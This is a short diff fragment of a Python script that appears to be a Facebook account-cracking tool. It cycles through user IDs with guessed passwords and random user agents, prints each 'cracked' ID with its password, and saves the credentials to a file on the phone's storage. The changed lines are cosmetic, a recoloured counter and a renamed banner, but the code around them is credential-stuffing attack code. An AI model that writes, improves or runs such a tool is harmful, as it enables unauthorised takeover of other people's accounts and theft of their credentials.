@@ -286,7 +286,7 @@ def login1(uid):
     Session = requests.session()
     try:
         sys.stdout.write(
-            f'\r\r\x1b[38;5;46m[\x1b[38;5;46mANAS\x1b[38;5;46m-\x1b[38;5;46mA1\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\033[1;97m{loop}\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46mOK\x1b[38;5;46m/\x1b[38;5;91mCP\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46m{len(oks)}\x1b[38;5;46m/\x1b[38;5;46m{len(cps)}\x1b[38;5;46m]'
+            f'\r\r\x1b[38;5;46m[\x1b[38;5;46mANAS\x1b[38;5;46m-\x1b[38;5;46mA1\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\033[1;97m{loop}\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46mOK\x1b[38;5;46m/\x1b[38;5;160mCP\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46m{len(oks)}\x1b[38;5;46m/\x1b[38;5;46m{len(cps)}\x1b[38;5;46m]'
         )
         sys.stdout.flush()
         ua = random.choice(ugen)
@@ -334,7 +334,7 @@ def login1(uid):
                 oks.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mALi\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mANAS\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');
                 open("/sdcard/ANAS-CLONE-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
